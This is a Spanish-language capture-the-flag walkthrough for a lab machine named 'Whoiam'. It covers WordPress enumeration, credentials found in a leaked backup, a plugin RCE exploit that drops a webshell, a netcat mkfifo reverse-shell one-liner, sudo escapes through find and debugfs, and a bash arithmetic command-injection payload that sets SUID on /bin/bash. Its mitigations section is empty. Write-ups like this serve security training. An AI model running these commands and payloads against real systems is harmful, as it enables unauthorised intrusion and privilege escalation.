# WHOIAM

#### Dificultad: Fácil

___

#### FASE RECONOCIMIENTO:

1. **Escaneo**:

Usaremos `nmap -n -v --open -sV -sC -Pm -oN escaneo <IP>`.  

Del mismo obtenemos:  
* el puerto 80 está abierto
* la versión es Apache 2.4.58
* que el sistema objetivo es un Ubuntu

Ahora, procedemos con `whatweb <IP>` para más **Footprinting Web**. Vemos que también tiene *JQuery 3.7.1*. Podría sernos útil más adelante.  

2. **Enumeración Web**:  

2.1. Empezamos con los **Directorios**, usando, por ejemplo:  

`wfuzz -c --hc 404 -t 200 -z file,<diccionario> -R 3 -u "http://<IP>/FUZZ"`  

Encontramos:  

```
- /backups/		
- /wp-includes/
- /wp-admin/			
  - /wp-login.php?redirect_to=http%3A%2F%2F172.18.0.3%2Fwp-admin%2F&reauth=1
- /wp-content/				
- /wp-content/upgrade    	
- /wp-content/plugins    
- /wp-content/themes     
- /wp-content/uploads    	
- /wp-includes/l10n   		I
- /wp-includes/certificate
- /wp-includes/sitemaps  
- /wp-includes/widgets   
- /wp-includes/fonts     
- /wp-includes/customize 
- /wp-includes/blocks    
- /wp-includes/assets    
- /wp-includes/images    
- /wp-includes/css       
- /wp-includes/js    
```

2.2 Ahora proseguimos con los **Recursos** (*PHP-HTML-TXT*):  

`wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt -u "http://<IP>/FUZZ.FUZ2Z"`  

```
- /index.php       
- /license.txt     		
- /readme.html     
- /wp-login.php    		
- /xmlrpc.php  		    	
- /wp-trackback.php
- /wp-config.php
- /wp-admin/media-new.php
```

3. Búsqueda de Vulnerabilidades:
No parecen haber vulnerabilidades por el momento.

___

#### FASE EXPLOTACIÓN:
**Web**:  
De dichas enumeraciónes, por el momento nos quedamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos.
Primero revisamos localmente, sin extraer para estar seguros, con `unzip -l <zip>`. Vemos que contiene un único archivito llamado `29DBMay`.  
Ahora procedemos a extraerlo con `unzip <zip>`. Le hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`.  
Investigando un poco con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` y en la web, vemos que no se trata de una hash válido ni base64, entonces probablemente sea la password, en texto claro.  

Entonces, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php` y logramos **Footholding Web**.  

**Sistema**:  
Navegando por el dashboard encontramos otro endpoint interesante, por el cual podríamos pobrar subir una *WebShell* y así lograr **Acceso Inicial al Sistema**. Este recurso es `/wp-admin/media-new.php`. Al intentar subir algún archivo nos damos cuenta que no es posible, porque no tenemos los permisos como `developer`.  

Entonces, probamos hacer más **Footprinting Web**. Encontramos que: 

* Se trata de un WordPress 6.8.3
* Hay *Plugins* instalados como:
	* Askimet 5.3.2
	* Modern Events Calendar Lite 5.16.2

* Tiene *Temas* como:  
	*  Twenty Twenty-Four 1.1
	*  Twenty Twenty-Three 1.4
	*  Twenty Twenty-Two 1.7
			
* Hay otro usuario *admin* llamado `eric`.  

Entones usamos la herramienta `searchsploit` para buscar **Exploits**. Después de algún tiempo, encontramos uno directo para RCE, para el **Plugin Modern Events Calendar Lite 5.16.2** de Wordpress. Lo descargamos con `searchsploit -m <exploit>`.  

Siguiendo las instrucciones del mismo, nos termina dando la URL de la webshell que acaba de subir:  
`http://<IP_Whoiam>/wp-content/uploads/shell.php)`  

Nos dirigimos allí en el navegador y nos abre una [PownyWebShell](https://github.com/flozz/p0wny-shell). Esta se lanza en propio browser. Es bastante limitada, pero nos da un **FootHolding en el Sistema**.  

Entonces, hacemos rápidamente un `whoami` y nos devuelve `www-data`. Dicho esto, nos apuramos a lanzar una Reverse Shell para tener más control localmente. Para ello, preparamos un listener. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda escuchando. 

Primero vemos las herramientas instaladas en el sistema para ver con qué podemos correr la RevShell. Hacemos rápidamente `which python python2 python3 nc` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y probando y probando encontramos que la manera de lanzarla según la config de la víctima es con la versión portable (POSIX) ejecutado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  

Una vez lograda la conexión, tenemos mucha más funcionalidad.  

Lanzamos `whoami` y somos `www-data`.  

#### FASE POST-EXPLOTACIÓN: Elevar Privilegios

Ahora sí, una vez que tenemos **FootHolding** es turno de **Enumerar Usuarios**. Lo hacemos de las siguientes maneras:  

* cat /etc/passwd
* ls -l /home/

Conseguimos 2 usuarios relevantes:  

1. rafa
2. ruben

> Ambos usan /bin/bash.  

Bien, ahora, lo que debemos hacer es buscar **Binarios SUID** y **Privilegios Sudo**.  
Para el primero corremos `find / -type f -perm -4000 2>/dev/null | xargs ls -l`.  
Esto no nos devuelve ninguno relevante.  

Entonces, probamos `sudo -l`:  
`(rafa) NOPASSWD: /usr/bin/find`  

> Esto significa que podemos correr `sudo` con `find` como `rafa` y sin password.  

Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `find` filtrando por `sudo`. Terminamos corriendo `sudo -u rafa find . -exec /bin/bash \; -quit` y logramos hacer **Movimiento Lateral** al usuario `rafa`.  

Ahora desde este nuevo usuario, volvemos a ejecutar `sudo -l` y nos devuelve:  
`(ruben) NOPASSWD: /usr/sbin/debugfs`  

> Podemoos lanzar `debugfs` con Privilegios Elevados como el usuario `ruben` y sin contraseña.  

Debemos a hacer **Explotación Sudo** devuelta para poder hacer **Movimiento Lateral** hacia `ruben`. Vamos a la *GTFOBins* nuevamente y buscamos `debugfs` filtrando por `sudo`.  

Terminamos lanzando `sudo -u ruben /usr/sbin/debugfs`, nos sale un prompt, le damos a `!/bin/bash` y ya somos `ruben`.  

Ahora,  otra vez, chequeamos los **Privilegios Sudo** con `sudo -l` y nos devuelve:  
`(ALL) NOPASSWD: /bin/bash /opt/penguin.sh`

> Podemos lanzar dicho script como root  

Entonces, siguiente paso, es saber qué hace el script para intentar explotarlo. Lo averiguamos con `cat /opt/penguin.sh`. Vemos el código:  

```
#!/bin/bash
read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

> El script espera una entrada de texto en crudo (no interpreta los caracteres de escape como *\n*, etc), la parsea a entero comparándola con *42*. Si es igual devuelve "Correct", si no, "Wrong".  

Entonces, en este punto, hay que estar pensando en que la solución podría estar en una **Inyección de Comandos por Expansión de Shell**. Significa que puedo pasarle un comando del sistema que pueda permitirme **Elevar Privilegios**.  

Por lo tanto, corro el script con `sudo -u root /bin/bash /opt/penguin.sh`, me lanza el prompt y le mando `a[$(chmod u+s /bin/bash)]+42, por ejemplo.  

> El `Bloque IF` intenta parsear la entrada a entero para poder compararla con 42 como dijimos. En este proceso, al querer acceder al valor del índice 0 del array, ejecuta la **Expansión de Comandos $(...)**. La orden maliciosa termina, efectivamente, corriendo con privilegios de root. Entonces, esto concluye dándole el **Permiso SUID** a */bin/bash*, lo cual es extremadamente peligroso.  

>  Como el Array ingresado se termina parseando a 0 en el bloque condicional de `if`, puesto que el primer dígito es un caracter, el +42 tiene la función de no dar errores y el script se ejecute normalmente (no hace falta, es un adorno).

Ahora hacemos `whoami` y somos `root`. Eso es todo.



#### MITIGACIONES:  
